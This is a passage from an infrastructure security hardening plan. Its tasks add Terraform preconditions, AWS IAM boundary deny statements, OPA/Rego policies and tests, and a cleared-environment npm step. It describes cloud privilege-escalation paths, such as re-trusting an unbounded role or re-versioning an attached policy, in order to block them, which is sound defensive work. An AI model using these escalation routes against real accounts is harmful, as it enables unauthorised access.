  description = "Explicit waiver: let a production environment (environment_config is_production) plan with its VPC-SC perimeter in dry-run or absent. Default false fails the plan, because dry-run gives no exfiltration protection. Set it only for the first rollout while you read the violation logs, through config/tfc-workspaces.yaml (reviewed), then remove it."
  type        = bool
  default     = false
}
```

Replace `check "vpc_sc_enforced_in_prod"` (lines 298-307) with:

```hcl
# Production needs an enforced perimeter. Dry-run gives no exfiltration
# protection; production_vpc_sc_dry_run_waived is the explicit, reviewed
# exception for a first rollout.
resource "terraform_data" "production_vpc_sc_enforced" {
  count = local.is_production ? 1 : 0

  lifecycle {
    precondition {
      condition     = var.production_vpc_sc_dry_run_waived || (local.vpc_sc_access_policy != null && !local.vpc_sc_enable_dry_run)
      error_message = "Environment '${var.environment}' is production but its VPC-SC perimeter is ${local.vpc_sc_access_policy == null ? "NOT CREATED (no scoped access policy in environment_config and vpc_sc_access_policy_name is null)" : "in DRY-RUN (vpc_sc_enable_dry_run = true)"}. Dry-run gives no exfiltration protection: validate the violation logs, then set vpc_sc_enable_dry_run = false. For a first rollout only, set production_vpc_sc_dry_run_waived = true in config/tfc-workspaces.yaml."
    }
  }
}
```

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=envs/gcp/workload TERRAFORM="$TF"
```

Expected: all pass. A run in `presets.tftest.hcl` that plans `prod` with dry-run on must set `is_production = false` (it does today, line 29) or the waiver.

- [ ] **Step 5: Docs**

- `docs/known-gaps.md` G11: add "Production dry-run now fails the plan unless `production_vpc_sc_dry_run_waived = true` (SEC-8)."
- `UPGRADING.md` `## Unreleased`: "**Production VPC-SC dry-run fails the plan (GCP workload).** Enforce the perimeter (`vpc_sc_enable_dry_run = false`), or set `production_vpc_sc_dry_run_waived = true` for `gcp-workload-<prod env>` in `config/tfc-workspaces.yaml` during a first rollout."
- `CHANGELOG.md` `#### Security`: "**Production VPC-SC in dry-run fails the plan (SEC-8).**"

- [ ] **Step 6: Commit**

```bash
git add envs/gcp/workload docs/known-gaps.md UPGRADING.md CHANGELOG.md
git commit -m "feat(gcp-workload)!: fail production plans with a dry-run perimeter

BREAKING CHANGE: production needs an enforced perimeter or an explicit waiver."
```

---

### Task 10: SEC-9 (+ SEC-12 KMS alias): close the tfc-apply boundary escalation paths

**Files:**
- Modify: `modules/aws/iam/tfc-oidc-baseline/main.tf:188-232` (`DenyProtectedKeyTampering`), `:292-300` (after `DenyLongLivedIamUserCredentials`), `:137-147` (`apply_boundary_propagation_statements`)
- Modify: `modules/aws/iam/tfc-oidc-baseline/variables.tf` (new `enable_apply_trust_update_lock`)
- Test: `modules/aws/iam/tfc-oidc-baseline/tests/plan_assertions.tftest.hcl` (new runs; existing size assertions at lines 397, 566 stay)
- Docs: `docs/known-gaps.md:351-363` (A10 residual), `UPGRADING.md`, `CHANGELOG.md`, `modules/aws/iam/tfc-oidc-baseline/README.md` (`make docs`)

Why: `DenyRoleWithoutApplyBoundary` (`main.tf:129-137`) gates `CreateRole`, `AttachRolePolicy`, `PutRolePolicy` and `PutRolePermissionsBoundary` by `iam:PermissionsBoundary`. A pre-existing unbounded role is still open through `UpdateAssumeRolePolicy` (trust it, then assume it), `CreatePolicyVersion` / `SetDefaultPolicyVersion` on a customer-managed policy attached to it, group policies, and console passwords. `iam:PermissionsBoundary` is not evaluated for `UpdateAssumeRolePolicy`, so a condition-based deny would deny every role anyway (Decision 5).

Measured size: the embedded boundary renders to 4,478 characters today (scratchpad run, 2026-11-11). The additions are about 700 characters, under the 6,144 managed-policy limit that the existing assertions check.

Self-lockout check:
- No repo module creates `aws_iam_group`, `aws_iam_user`, `aws_iam_user_login_profile` or `aws_iam_policy` (grep of `modules/` and `envs/`: only `aws_iam_role_policy_attachment`). The group, login-profile and policy-version denies break no repo apply.
- Policies the pipeline creates under path `/tfc-managed/` keep versioning (`NotResource`).
- `UpdateAssumeRolePolicy` lock: CreateRole still sets a trust, so new roles work. Trust edits on existing roles go to break-glass. Break-glass (`var.break_glass_role_name`) and the StackSet execution role do not carry this boundary.
- KMS alias deny: matches only aliases whose current or target key has `protected = true`. Creating an alias on a new key still works.

- [ ] **Step 1: Write the failing tests**

Append to `modules/aws/iam/tfc-oidc-baseline/tests/plan_assertions.tftest.hcl`:

```hcl
run "boundary_blocks_brownfield_escalation_paths" {
  command = plan

  assert {
    condition = anytrue([
      for s in jsondecode(output.template_body).Resources.TfcApplyBoundary.Properties.PolicyDocument.Statement :
      s.Effect == "Deny" && s.Resource == "*" && alltrue([for a in ["iam:PutGroupPolicy", "iam:AttachGroupPolicy", "iam:AddUserToGroup", "iam:UpdateLoginProfile", "iam:AttachUserPolicy", "iam:PutUserPolicy"] : contains(s.Action, a)])
    ])
    error_message = "the boundary must deny group policies, group membership, user policies and console password changes."
  }

  assert {
    condition = anytrue([
      for s in jsondecode(output.template_body).Resources.TfcApplyBoundary.Properties.PolicyDocument.Statement :
      s.Effect == "Deny" && contains(s.Action, "iam:CreatePolicyVersion") && contains(s.Action, "iam:SetDefaultPolicyVersion") &&
      try(s.NotResource[0]["Fn::Sub"], "") == "arn:$${AWS::Partition}:iam::$${AWS::AccountId}:policy/tfc-managed/*"
    ])
    error_message = "the boundary must deny re-versioning any customer-managed policy outside /tfc-managed/."
  }

  assert {
    condition = anytrue([
      for s in jsondecode(output.template_body).Resources.TfcApplyBoundary.Properties.PolicyDocument.Statement :
      s.Effect == "Deny" && s.Action == ["iam:UpdateAssumeRolePolicy"] && s.Resource == "*"
    ])
    error_message = "with enable_apply_trust_update_lock (default true) the boundary must deny every trust-policy update."
  }

  assert {
    condition = anytrue([
      for s in jsondecode(output.template_body).Resources.TfcApplyBoundary.Properties.PolicyDocument.Statement :
      s.Sid == "DenyProtectedKeyTampering" && contains(s.Action, "kms:UpdateAlias") && contains(s.Action, "kms:DeleteAlias")
    ])
    error_message = "retargeting or deleting the alias of a protected key must be denied."
  }

  assert {
    condition     = length(jsonencode(jsondecode(output.template_body).Resources.TfcApplyBoundary.Properties.PolicyDocument)) < 6144
    error_message = "the boundary must stay under the 6,144-character managed policy limit."
  }
}

run "trust_update_lock_opt_out" {
  command = plan

  variables {
    enable_apply_trust_update_lock = false
  }

  assert {
    condition = !anytrue([
      for s in jsondecode(output.template_body).Resources.TfcApplyBoundary.Properties.PolicyDocument.Statement :
      s.Effect == "Deny" && s.Action == ["iam:UpdateAssumeRolePolicy"] && s.Resource == "*"
    ])
    error_message = "enable_apply_trust_update_lock = false removes the trust-update deny."
  }
}
```

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=modules/aws/iam/tfc-oidc-baseline TERRAFORM="$TF"
```

Expected: the first four assertions of `boundary_blocks_brownfield_escalation_paths` fail; `trust_update_lock_opt_out` fails with an undeclared variable.

- [ ] **Step 3: Implement**

`variables.tf`:

```hcl
variable "enable_apply_trust_update_lock" {
  description = "Deny iam:UpdateAssumeRolePolicy to the tfc-apply identity on every role (in the embedded boundary). The iam:PermissionsBoundary condition key is not evaluated for that action, so a pre-existing unbounded role could otherwise be re-trusted and assumed. New roles are unaffected (CreateRole sets the trust); a trust change on an existing role goes through break-glass. Default true."
  type        = bool
  default     = true
}
```

`main.tf`: add `"kms:UpdateAlias", "kms:DeleteAlias"` to the `Action` list of `DenyProtectedKeyTampering` (line 215). After `DenyLongLivedIamUserCredentials` (line 297), add:

```hcl
      {
        # Escalation through a pre-existing group or user: no module in this
        # repo manages IAM groups or users, so the pipeline never needs these.
        Sid    = "DenyGroupUserAndLoginProfileEscalation"
        Effect = "Deny"
        Action = [
          "iam:CreateGroup",
          "iam:PutGroupPolicy",
          "iam:AttachGroupPolicy",
          "iam:AddUserToGroup",
          "iam:AttachUserPolicy",
          "iam:PutUserPolicy",
          "iam:UpdateLoginProfile",
        ]
        Resource = "*"
      },
      {
        # A new default version of a customer-managed policy attached to an
        # unbounded (pre-existing) role would grant that role anything. Only
        # pipeline-owned policies under /tfc-managed/ may be re-versioned.
        Sid         = "DenyForeignPolicyVersioning"
        Effect      = "Deny"
        Action      = ["iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion"]
        NotResource = [{ "Fn::Sub" = "arn:$${AWS::Partition}:iam::$${AWS::AccountId}:policy/tfc-managed/*" }]
      },
```

Append to `apply_boundary_propagation_statements` input list a third element, filtered by the new flag. Change the for-expression filter to keep the existing two only with propagation and the new one only with the lock:

```hcl
  apply_trust_update_lock_statements = [for s in [{
    Sid      = "DenyTrustPolicyUpdates"
    Effect   = "Deny"
    Action   = ["iam:UpdateAssumeRolePolicy"]
    Resource = "*"
  }] : s if var.enable_apply_trust_update_lock]
```

and in `apply_boundary_document.Statement` change `local.apply_boundary_propagation_statements,` to `local.apply_boundary_propagation_statements, local.apply_trust_update_lock_statements,` inside the `concat`.

The existing `baseline_tamper_statement` already denies `UpdateAssumeRolePolicy` on the TFC roles, so the lock is additive.

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=modules/aws/iam/tfc-oidc-baseline TERRAFORM="$TF"
make test TEST_DIRS=modules/aws/stages/organization TERRAFORM="$TF"
make docs
```

Expected: all pass, the size assertion holds.

- [ ] **Step 5: Docs**

- `docs/known-gaps.md:362-363` (A10): replace "Residual: `iam:UpdateAssumeRolePolicy` on pre-existing unbounded roles that the deny-tamper SCP does not protect" with "Closed in the boundary: trust updates (`enable_apply_trust_update_lock`), foreign policy versioning, group/user policy and login-profile changes, protected-key alias retargeting. Residual: the deny-tamper SCP does not mirror the alias deny (SCP size, ARC-18 workstream), so a member-account admin outside the pipeline can still retarget an alias."
- `UPGRADING.md` `## Unreleased`: "**tfc-apply boundary (AWS).** Trust-policy edits on existing roles now need break-glass (`enable_apply_trust_update_lock = false` reverts). Customer-managed policies you create in the pipeline must use `path = \"/tfc-managed/\"` to stay updatable. Update the StackSet (apply `aws-organization`)."
- `CHANGELOG.md` `#### Security`: "**tfc-apply boundary closes brownfield escalation (SEC-9) and protected-key alias retargeting (SEC-12).**"

- [ ] **Step 6: Commit**

```bash
git add modules/aws/iam/tfc-oidc-baseline docs/known-gaps.md UPGRADING.md CHANGELOG.md
git commit -m "feat(aws)!: deny trust rewrites and foreign policy versions in the tfc-apply boundary

BREAKING CHANGE: trust edits on existing roles need break-glass by default."
```

---

### Task 11: SEC-10: mandatory OPA policy against wildcard WIF bindings

**Files:**
- Create: `policies/opa/gcp_wif_principalset_pinned.rego`, `policies/opa/gcp_wif_principalset_pinned_test.rego`
- Modify: `policies/opa/policies.hcl` (new mandatory and advisory entries)
- Docs: `docs/architecture/policy-as-code.md`, `docs/compliance/control-matrix.md` (CHG-04 list), `CHANGELOG.md`, `docs/known-gaps.md`

Why: a workload apply SA holds `workloadIdentityPoolAdmin` and `serviceAccountAdmin` on its folder. It can bind `principalSet://.../workloadIdentityPools/<pool>/*` on a deploy SA. `custom.wifProviderTenantPinned` pins the owner, so `/*` means "every repository of the owner". After Task 7, no repo module emits a whole-pool, owner-wide, name-based or ref-only binding. `modules/gcp/iam/workload-identity/main.tf:82` still emits `attribute.repository_id/<id>` when neither ref nor environment is set; that stays advisory (not mandatory), because the primitive is library code.

Self-lockout check: the mandatory rule matches only known member strings. Unknown members (a pool created in the same run) are not denied; the advisory rule reports them.

- [ ] **Step 1: Write the failing tests**

Create `policies/opa/gcp_wif_principalset_pinned_test.rego`:

```rego
package terraform.policies.gcp_wif_principalset_pinned_test

import rego.v1

import data.terraform.policies.gcp_wif_principalset_pinned as p

pool := "principalSet://iam.googleapis.com/projects/2/locations/global/workloadIdentityPools/apps-prod"

one(type, after) := {"plan": {"resource_changes": [{
	"address": sprintf("%s.x", [type]), "mode": "managed", "type": type,
	"change": {"actions": ["create"], "after": after, "after_unknown": {}},
}]}}

sa_member(m) := one("google_service_account_iam_member", {"role": "roles/iam.workloadIdentityUser", "member": m})

test_whole_pool_denied if count(p.deny) == 1 with input as sa_member(sprintf("%s/*", [pool]))

test_owner_wide_denied if count(p.deny) == 1 with input as sa_member(sprintf("%s/attribute.repository_owner_id/42", [pool]))

test_repository_name_denied if count(p.deny) == 1 with input as sa_member(sprintf("%s/attribute.repository/acme/api", [pool]))

test_ref_only_denied if count(p.deny) == 1 with input as sa_member(sprintf("%s/attribute.ref/refs/heads/main", [pool]))

test_binding_list_denied if {
	count(p.deny) == 1 with input as one("google_service_account_iam_binding", {"role": "roles/iam.workloadIdentityUser", "members": ["group:a@acme.io", sprintf("%s/*", [pool])]})
}

test_policy_data_denied if {
	doc := json.marshal({"bindings": [{"role": "roles/iam.workloadIdentityUser", "members": [sprintf("%s/*", [pool])]}]})
	count(p.deny) == 1 with input as one("google_service_account_iam_policy", {"policy_data": doc})
}

test_repo_env_pin_passes if count(p.deny) == 0 with input as sa_member(sprintf("%s/attribute.repo_env/123/prod", [pool]))

test_repo_ref_env_pin_passes if count(p.deny) == 0 with input as sa_member(sprintf("%s/attribute.repo_ref_env/123/refs/heads/main/prod", [pool]))

test_repository_id_only_is_advisory if {
	inp := sa_member(sprintf("%s/attribute.repository_id/123", [pool]))
	count(p.deny) == 0 with input as inp
	count(p.repo_wide) == 1 with input as inp
}

test_unknown_member_is_advisory if {
	inp := {"plan": {"resource_changes": [{
		"address": "google_service_account_iam_member.x", "mode": "managed", "type": "google_service_account_iam_member",
		"change": {"actions": ["create"], "after": {"role": "roles/iam.workloadIdentityUser"}, "after_unknown": {"member": true}},
	}]}}
	count(p.deny) == 0 with input as inp
	count(p.repo_wide) == 1 with input as inp
}
```

- [ ] **Step 2: Run and confirm failure**

```bash
opa test policies/opa -v --run 'gcp_wif_principalset_pinned'
```

Expected: every test fails (`p.deny` is undefined, package not found).

- [ ] **Step 3: Implement**

Create `policies/opa/gcp_wif_principalset_pinned.rego`:

```rego
# MANDATORY (deny) + ADVISORY (repo_wide): workload identity bindings must pin
# the repository AND a ref or environment. The GitHub provider condition pins
# only the owner (custom.wifProviderTenantPinned), so a principalSet on the
# whole pool, the owner, a mutable repository name or a bare ref trusts every
# repository of the owner. Unknown members cannot be checked at plan time and
# are reported by the advisory rule.
package terraform.policies.gcp_wif_principalset_pinned

import rego.v1

import data.terraform.lib

pool_prefix := `^principalSet://iam\.googleapis\.com/projects/[^/]+/locations/global/workloadIdentityPools/[^/]+/`

too_wide_patterns := [
	`\*$`,
	`attribute\.repository_owner_id/`,
	`attribute\.repository/`,
	`attribute\.ref/`,
]

iam_member_or_binding(t) if regex.match(`^google_[a-z0-9_]+_iam_(member|binding)$`, t)

iam_policy(t) if regex.match(`^google_[a-z0-9_]+_iam_policy$`, t)

members(rc) := rc.change.after.members if is_array(rc.change.after.members)

members(rc) := [rc.change.after.member] if is_string(rc.change.after.member)

members(rc) := [m |
	doc := lib.policy_doc(rc.change.after.policy_data)
	some binding in object.get(doc, "bindings", [])
	some m in object.get(binding, "members", [])
] if iam_policy(rc.type)

too_wide(m) if {
	some pat in too_wide_patterns
	regex.match(concat("", [pool_prefix, pat]), m)
}

deny contains msg if {
	some rc in lib.managed
	lib.writes(rc)
	iam_member_or_binding(rc.type)
	some m in members(rc)
	too_wide(m)
	msg := sprintf("%s: %s trusts more than one repository + ref/environment (whole pool, owner, repository name or bare ref)", [rc.address, m])
}

deny contains msg if {
	some rc in lib.managed
	lib.writes(rc)
	iam_policy(rc.type)
	some m in members(rc)
	too_wide(m)
	msg := sprintf("%s: policy_data member %s trusts more than one repository + ref/environment", [rc.address, m])
}

repo_wide contains msg if {
	some rc in lib.managed
	lib.writes(rc)
	iam_member_or_binding(rc.type)
	some m in members(rc)
	regex.match(concat("", [pool_prefix, `attribute\.repository_id/[^/]+$`]), m)
	msg := sprintf("%s: %s trusts every branch and environment of the repository; pin ref or environment", [rc.address, m])
}

repo_wide contains msg if {
	some rc in lib.managed
	lib.writes(rc)
	iam_member_or_binding(rc.type)
	lib.unknown(rc, "member")
	msg := sprintf("%s: member is unknown at plan time and cannot be checked for a wildcard principalSet", [rc.address])
}
```

Add to `policies/opa/policies.hcl` in the identity section:

```hcl
policy "gcp_wif_principalset_pinned" {
  query             = "data.terraform.policies.gcp_wif_principalset_pinned.deny"
  enforcement_level = "mandatory"
}

policy "gcp_wif_principalset_repo_wide" {
  query             = "data.terraform.policies.gcp_wif_principalset_pinned.repo_wide"
  enforcement_level = "advisory"
}
```

- [ ] **Step 4: Run and confirm pass**

```bash
opa check --strict policies/opa policies/opa-destructive
opa test policies/opa policies/opa-destructive -v
```

Expected: all tests pass, 10 new.

- [ ] **Step 5: Docs**

- `docs/architecture/policy-as-code.md` and `docs/compliance/control-matrix.md` CHG-04: add `gcp_wif_principalset_pinned` to the mandatory list and `gcp_wif_principalset_repo_wide` to the advisory list.
- `docs/known-gaps.md` WS3 section: "**Workload SAs keep `workloadIdentityPoolAdmin` (SEC-10).** Needed by app-services for the app-deploy pool. Provider conditions are pinned by `custom.wifProviderTenantPinned`; wildcard bindings are denied by OPA at apply time. A binding whose member is unknown at plan time is advisory only."
- `CHANGELOG.md` `#### Security`: "**Wildcard WIF bindings are denied (SEC-10).**"

- [ ] **Step 6: Commit**

```bash
git add policies/opa docs CHANGELOG.md
git commit -m "feat(policies): deny whole-pool and owner-wide WIF principalSet bindings"
```

---

### Task 12: SEC-11: codify the drift team, without plan rights on secret-bearing projects

**Files:**
- Modify: `envs/tfc-admin/variables.tf` (new `drift_team_id` after `state_backup_team_id`)
- Modify: `envs/tfc-admin/main.tf:751-758` (new `drift_custom_access`), `:826-861` (`team_project_access`), `:935-965` (preconditions)
- Modify: `.github/workflows/drift-detection.yml:11-40` (header), `:156` (default list comment)
- Test: `envs/tfc-admin/tests/root.tftest.hcl`
- Docs: `docs/guides/CI_SECRETS.md:13`, `docs/runbooks/bootstrap.md:227`, `docs/compliance/control-matrix.md` (CHG-05), `CHANGELOG.md`

Why: `TFC_TOKEN_DRIFT` comes from a team that is created and granted by hand. Nothing stops it from holding plan rights on `saas-*` or tfc-admin, where a plan can read static tokens. Task 1 gives the derived secret-bearing set; this task grants the drift team plan rights only outside it. TFC health assessments (`enable_health_assessments`, default true) still cover the secret-bearing workspaces.

Self-lockout check: the drift team holds no apply and no variable access. Removing it breaks only the GitHub drift job, never an apply. The token itself is still created by an owner, with an expiry, so it never enters state (the same rule as `saas_outputs_reader_team_ids`, `envs/tfc-admin/main.tf:1070-1077`).

- [ ] **Step 1: Write the failing tests**

```hcl
run "drift_team_plans_only_outside_secret_bearing_projects" {
  command = plan

  variables {
    split_workload_projects = true
    platform_team_id        = "team-platform1"
    drift_team_id           = "team-drift1"
    workspace_variables = {
      "gcp-workload-prod" = {
        TFE_TOKEN = { value = "not-a-real-token", category = "env", sensitive = true }
      }
    }
  }

  assert {
    condition = (
      toset([for k, g in tfe_team_project_access.this : split("/", k)[0] if g.team_id == "team-drift1"]) == toset(["gcp", "aws", "aws-workloads"]) &&
      alltrue([for k, g in tfe_team_project_access.this : (
        g.workspace_access[0].runs == "plan" && g.workspace_access[0].variables == "none" &&
        g.workspace_access[0].state_versions == "read" && g.workspace_access[0].locking == false
      ) if g.team_id == "team-drift1"])
    )
    error_message = "the drift team gets runs = plan, state read, no variables, and never a secret-bearing project (saas, gcp-workloads with the token)."
  }
}

run "drift_team_must_be_dedicated" {
  command = plan

  variables {
    platform_team_id = "team-same1"
    drift_team_id    = "team-same1"
  }

  expect_failures = [terraform_data.input_contract]
}
```

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=envs/tfc-admin TERRAFORM="$TF"
```

Expected: both runs fail with "An input variable with the name drift_team_id has not been declared".

- [ ] **Step 3: Implement**

`variables.tf`:

```hcl
variable "drift_team_id" {
  description = "Team whose token is TFC_TOKEN_DRIFT (drift-detection.yml). Gets runs = plan and state read on every project except guardrails and the secret-bearing projects: a plan there could read static tokens. Create the team and its token by hand with an expiry (the token never enters state). Null = no grant."
  type        = string
  default     = null

  validation {
    condition     = var.drift_team_id == null || can(regex("^team-[A-Za-z0-9]+$", var.drift_team_id))
    error_message = "drift_team_id must be a TFC team ID (team-...)."
  }
}
```

`main.tf`, after `state_backup_custom_access`:

```hcl
  # Drift export team (drift-detection.yml): refresh-only plans and state read.
  drift_custom_access = {
    runs           = "plan"
    variables      = "none"
    state_versions = "read"
    sentinel_mocks = "none"
    locking        = false
  }
```

In `team_project_access`, add:

```hcl
    var.drift_team_id == null ? {} : {
      for p in setsubtract(local.shared_access_projects, local.secret_bearing_projects) : "${p}/drift" => {
        project = p
        team_id = var.drift_team_id
        access  = "custom"
        custom  = local.drift_custom_access
      }
    },
```

Add to `terraform_data.input_contract`:

```hcl
    precondition {
      condition = var.drift_team_id == null || !contains(
        concat(compact([var.platform_team_id, var.control_plane_approvers_team_id, var.security_team_id, var.tfc_admin_team_id, var.state_backup_team_id, var.saas_approvers_team_id]), var.viewer_team_ids, values(var.saas_outputs_reader_team_ids)),
        coalesce(var.drift_team_id, "-"),
      )
      error_message = "drift_team_id must be a dedicated team: its token lives in GitHub (environment tfc-drift) and may queue plans, so it must carry nothing else."
    }
```

`drift-detection.yml` header: "TFC_TOKEN_DRIFT is the token of tfc-admin's `drift_team_id`. It has no plan rights on secret-bearing projects (tfc-admin, saas, workloads with a static secret). Leave those workspaces out of TFC_DRIFT_WORKSPACES; HCP health assessments cover them."

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=envs/tfc-admin TERRAFORM="$TF"
```

Expected: all runs pass.

- [ ] **Step 5: Docs**

- `docs/guides/CI_SECRETS.md:13` and `docs/runbooks/bootstrap.md:227`: "`TFC_TOKEN_DRIFT`: token of the team set as tfc-admin `drift_team_id` (codified grants, hand-made token with `expired_at` 90 days out). Never a token with rights on secret-bearing projects."
- `docs/compliance/control-matrix.md` CHG-05: add "`drift_team_id` codifies the drift token's grants."
- `CHANGELOG.md` `#### Security`: "**The drift token's team is codified (SEC-11).**"

- [ ] **Step 6: Commit**

```bash
git add envs/tfc-admin .github/workflows/drift-detection.yml docs CHANGELOG.md
git commit -m "feat(tfc-admin): codify the drift team without secret-bearing plan rights"
```

---

### Task 13: SEC-12: npm ci runs with an empty environment

**Files:**
- Modify: `modules/supabase/vault-secrets/main.tf:56-74` (`npm_install_command`)
- Test: `modules/supabase/vault-secrets/tests/plan_assertions.tftest.hcl` (new run)
- Docs: `CLAUDE.md` ("vault-secrets Node.js dependency" section), `CHANGELOG.md`

Why: the provisioner `environment` (`POSTGRES_URL`, `VAULT_DESIRED_JSON`, `SUPABASE_SSL_CERT`) and the workspace's own env (`SUPABASE_ACCESS_TOKEN`) are visible to `npm ci`. `--ignore-scripts` stops lifecycle scripts, but npm itself, its config files and any registry redirect still see them. `env -i` clears the environment for `npm` only; `node` after `&&` keeps it. The KMS alias part of SEC-12 is in Task 10.

Self-lockout check: the trigger hashes do not include the command, so no provisioner re-runs on upgrade. `PATH` and `HOME` are kept, which npm needs on the HCP agent.

- [ ] **Step 1: Write the failing test**

```hcl
run "npm_install_sees_no_secret_environment" {
  command = plan

  assert {
    condition     = startswith(local.npm_install_command, "env -i PATH=\"$PATH\" HOME=\"$HOME\" npm ci --ignore-scripts ")
    error_message = "npm ci must run with a cleared environment: POSTGRES_URL, VAULT_DESIRED_JSON and the workspace's SUPABASE_ACCESS_TOKEN must not reach npm."
  }

  assert {
    condition     = strcontains(local.bootstrap_command, " && node ") && !startswith(split(" && ", local.bootstrap_command)[1], "env -i")
    error_message = "node must still get the provisioner environment."
  }
}
```

(Terraform 1.17 test assertions can read module locals; verified in the scratchpad.)

- [ ] **Step 2: Run and confirm failure**

```bash
make test TEST_DIRS=modules/supabase/vault-secrets TERRAFORM="$TF"
```

Expected: the first assertion fails.

- [ ] **Step 3: Implement**

```hcl
  # env -i: npm sees only PATH and HOME. The provisioner environment
  # (POSTGRES_URL, VAULT_DESIRED_JSON, SUPABASE_SSL_CERT) and the workspace's
  # own variables (SUPABASE_ACCESS_TOKEN) reach node, never npm or its config.
  npm_install_command = "env -i PATH=\"$PATH\" HOME=\"$HOME\" npm ci --ignore-scripts --no-audit --no-fund --prefix ${path.module}/scripts"
```

- [ ] **Step 4: Run and confirm pass**

```bash
make test TEST_DIRS=modules/supabase/vault-secrets TERRAFORM="$TF"
make test TEST_DIRS=modules/saas/stages/saas-workload TERRAFORM="$TF"
python3 scripts/check-plan-time-exec.py
```

Expected: all pass; the checker still allows the vault-secrets provisioners.

- [ ] **Step 5: Docs**

- `CLAUDE.md`, vault-secrets section: change the command to `env -i PATH="$PATH" HOME="$HOME" npm ci --ignore-scripts --no-audit --no-fund --prefix modules/supabase/vault-secrets/scripts` and add "npm sees no secret environment."
- `CHANGELOG.md` `#### Security`: "**`npm ci` in vault-secrets runs with a cleared environment (SEC-12).**"

- [ ] **Step 6: Commit**

```bash
git add modules/supabase/vault-secrets CLAUDE.md CHANGELOG.md
git commit -m "fix(supabase): run npm ci in vault-secrets with a cleared environment"
```

---

### Task 14: CICD-10: mandatory OPA controls fail closed on unknown values

**Files:**
- Modify: `policies/opa/lib_helpers.rego:62-72` (new `unknown_or_not`)
- Modify: `policies/opa/aws_s3_public_access.rego:35`, `policies/opa/gcs_no_public_buckets.rego:19`, `policies/opa/database_private_encrypted.rego:40`, `policies/opa/aws_kms_key_rotation.rego:15`
- Test: `policies/opa/lib_helpers_test.rego:30-37`, `policies/opa/database_private_encrypted_test.rego:48-55` (`test_unknown_encryption_skipped`), new tests in the other three suites
- Docs: `docs/architecture/policy-as-code.md`, `CHANGELOG.md`

Self-lockout check: every repo module sets these four attributes from literals or plan-known variables (`storage_encrypted`, `enable_key_rotation`, the four public-access-block booleans, `uniform_bucket_level_access`, `public_access_prevention`). A module that computes one of them from an apply-time value would now fail; the sandbox proof (below) confirms none does. The message tells the author to use a known value.

- [ ] **Step 1: Write the failing tests**

`lib_helpers_test.rego`, append:

```rego
test_unknown_or_not_flags_unknown if {
	lib.unknown_or_not({"change": {"actions": ["create"], "after": {}, "after_unknown": {"a": true}}}, "a", true)
}

test_unknown_or_not_passes_expected if {
	not lib.unknown_or_not({"change": {"actions": ["create"], "after": {"a": true}, "after_unknown": {}}}, "a", true)
}
```

Rename `test_unknown_encryption_skipped` in `database_private_encrypted_test.rego` to `test_unknown_encryption_denied` and change `count(p.deny) == 0` to `count(p.deny) == 1`. Add, in each of the other three test files (using each file's own helper):

```rego
# aws_kms_key_rotation_test.rego
test_unknown_rotation_denied if {
	inp := {"plan": {"resource_changes": [{
		"address": "aws_kms_key.k", "mode": "managed", "type": "aws_kms_key",
		"change": {"actions": ["create"], "after": {"customer_master_key_spec": "SYMMETRIC_DEFAULT"}, "after_unknown": {"enable_key_rotation": true}},
	}]}}
	count(p.deny) == 1 with input as inp
}
```

```rego
# gcs_no_public_buckets_test.rego
test_unknown_public_access_prevention_denied if {
	inp := {"plan": {"resource_changes": [{
		"address": "google_storage_bucket.b", "mode": "managed", "type": "google_storage_bucket",
		"change": {"actions": ["create"], "after": {"uniform_bucket_level_access": true}, "after_unknown": {"public_access_prevention": true}},
	}]}}
	count(p.deny) == 1 with input as inp
}
```

```rego
# aws_s3_public_access_test.rego
test_unknown_pab_switch_denied if {
	count(p.deny) == 1 with input as plan([{
		"address": "aws_s3_bucket_public_access_block.p", "module_address": "", "mode": "managed",
		"type": "aws_s3_bucket_public_access_block", "name": "p",
		"change": {"actions": ["create"], "after": {"block_public_acls": true, "ignore_public_acls": true, "restrict_public_buckets": true}, "after_unknown": {"block_public_policy": true}},
	}])
}
```

Before writing these, read each policy's `required` map or switch list and confirm the attribute names above match it; adjust the attribute used in the test to one the policy checks.

- [ ] **Step 2: Run and confirm failure**

```bash
opa test policies/opa -v
```

Expected: the two lib tests fail (`unknown_or_not` undefined), and the four unknown tests fail with `count(p.deny) == 0`.

- [ ] **Step 3: Implement**

`lib_helpers.rego`, after `known_and_not`:

```rego
# Fail-closed form for MANDATORY controls: the value is unknown at plan time,
# or known and different from the expected value. A security switch should be
# a plan-known value; an apply-time value cannot be checked, so it is denied.
unknown_or_not(rc, attr, expected) if unknown(rc, attr)

unknown_or_not(rc, attr, expected) if known_and_not(rc, attr, expected)
```

In the four policies, replace `lib.known_and_not(` with `lib.unknown_or_not(` and append to each message: `" (an unknown value counts as a violation: set a plan-known value)"`.

- [ ] **Step 4: Run and confirm pass**

```bash
opa check --strict policies/opa policies/opa-destructive
opa test policies/opa policies/opa-destructive -v
```

Expected: all pass.

- [ ] **Step 5: Docs**

- `docs/architecture/policy-as-code.md`: "Mandatory policies deny an unknown value for the attribute they check. Advisory policies may skip it."
- `CHANGELOG.md` `#### Security`: "**Mandatory OPA controls fail closed on unknown values (CICD-10).**"

- [ ] **Step 6: Commit**

```bash
git add policies/opa docs/architecture/policy-as-code.md CHANGELOG.md
git commit -m "fix(policies): fail closed on unknown values in mandatory controls"
```

---

### Task 15: CICD-11: destroy_guard covers backup, lock, registry and DNS types

**Files:**
- Modify: `policies/opa-destructive/destroy_guard.rego:14-62` (`protected_types`)
- Test: `policies/opa-destructive/destroy_guard_test.rego` (new tests after line 40)
- Docs: `docs/runbooks/aws-teardown.md` (security override note), `docs/architecture/policy-as-code.md`, `CHANGELOG.md`

Self-lockout check: the destructive set is overridable (`envs/tfc-admin`, `overridable = true`); the security team overrides an intended destroy. Teardown runbooks already require that override for the existing types.

- [ ] **Step 1: Write the failing tests**

Append to `destroy_guard_test.rego`:

```rego
test_aws_backup_vault_delete_denied if denied_delete("aws_backup_vault")

test_aws_backup_vault_lock_configuration_delete_denied if denied_delete("aws_backup_vault_lock_configuration")

test_aws_s3_bucket_object_lock_configuration_delete_denied if denied_delete("aws_s3_bucket_object_lock_configuration")

test_google_bigquery_dataset_delete_denied if denied_delete("google_bigquery_dataset")

test_aws_ecr_repository_delete_denied if denied_delete("aws_ecr_repository")

